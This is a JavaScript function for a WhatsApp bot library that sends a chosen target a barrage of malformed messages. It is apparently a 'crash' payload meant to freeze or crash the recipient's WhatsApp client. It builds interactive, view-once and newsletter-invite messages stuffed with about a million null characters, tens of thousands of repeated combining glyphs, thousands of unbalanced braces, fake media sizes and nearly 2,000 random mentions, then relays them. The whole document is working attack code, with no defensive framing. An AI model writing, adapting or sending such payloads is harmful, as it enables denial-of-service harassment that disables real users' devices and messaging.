async function CombinedMessages(sock, target) {
  try {
    const ButtonsPush = [
      {
        name: "single_select",
        buttonParamsJson: JSON.stringify({
          title: "ោ៝".repeat(2000),
          sections: [
            {
              title: "\u0000",
              rows: [],
            },
          ],
        }),
      },
    ];

    for (let i = 0; i < 100; i++) {
      ButtonsPush.push({
        name: "galaxy_message",
        buttonParamsJson: "\u0000".repeat(1045000),
      });
    }

    const blankSpamMessage = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊",
              hasMediaAttachment: true,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                fileLength: "9999999999999",
                height: 9999,
                width: 9999,
                mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755254367",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
              },
            },
            body: {
              text: "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: ButtonsPush,
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "131338822@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
              ],
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/fdynzaie",
                    unconsentedUsersUrl: "https://t.me/fdynzaie",
                    consentedUsersUrl: "https://t.me/fdynzaie",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/fdynzaie",
                    unconsentedUsersUrl: "https://t.me/fdynzaie",
                    consentedUsersUrl: "https://t.me/fdynzaie",
                    cardIndex: 2,
                  },
                ],
              },
            },
          },
        },
      },
    }, {});

    await sock.relayMessage(target, blankSpamMessage.message, {
      messageId: blankSpamMessage.key.id,
      participant: { jid: target },
      userJid: target,
    });

    const systemMessage = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            header: {
              title: "</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊" + "ꦽ".repeat(100000) + "ꦾ".repeat(10000),
            },
            body: {
              text: "</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊" + "\u200B".repeat(5000),
            },
            footer: {
              text: "</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊" + "\u200B".repeat(5000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{}".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(10000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`,
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3",
                  }),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: `null ${"ꦽ".repeat(19999)}`,
                    url: "https://t.me/fdynzaie",
                    merchant_url: "https://t.me/fdynzaie",
                  }),
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "\u200B".repeat(5000),
                    flow_cta: "ꦽ".repeat(10000),
                    flow_message_version: "3",
                  }),
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_message_version: "3",
                    flow_token: "unused",
                    flow_id: "1775342589999842",
                    flow_cta: "</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊",
                    flow_action: "navigate",
                    flow_action_payload: {
                      screen: "AWARD_CLAIM",
                      data: {
                        error_types: [],
                        campaigns: [],
                        categories: [
                          { id: "category_1", title: "Unicam" },
                          { id: "category_2", title: "Constantes" },
                          { id: "category_3", title: "Referidos" },
                        ],
                      },
                    },
                    flow_metadata: {
                      flow_json_version: 1000,
                      data_api_protocol: "I'm dying and bleeding of my past",
                      data_api_version: 9999999,
                      flow_name: "</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊",
                      categories: [],
                    },
                    icon: "REVIEW",
                    has_multiple_buttons: true,
                  }),
                },
              ],
            },
          },
        },
      },
    };

    const msg = await generateWAMessageFromContent(target, systemMessage, {
      userJid: sock?.user?.id,
    });

    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    const msg1 = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊" + "ꦽ".repeat(500) + "ꦾ".repeat(8000),
            caption: "ꦾ".repeat(9000),
            inviteExpiration: Date.now() + 9999999999,
          },
        },
      },
      contextInfo: {
        remoteJid: target,
        participant: target,
        stanzaId: sock.generateMessageTag(),
      },
    };

    const msg2 = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ꦾ".repeat(1000),
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊" + "ꦽ".repeat(2500) + "🌟".repeat(2000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
            },
          },
        },
      },
    };

    await Promise.all([
      sock.relayMessage(target, msg1),
      sock.relayMessage(target, msg2),
    ]);

    console.log(`All messages sent to ${target}`);
  } catch (err) {
    console.error(`Error sending combined message: ${err.message}`);
  }
}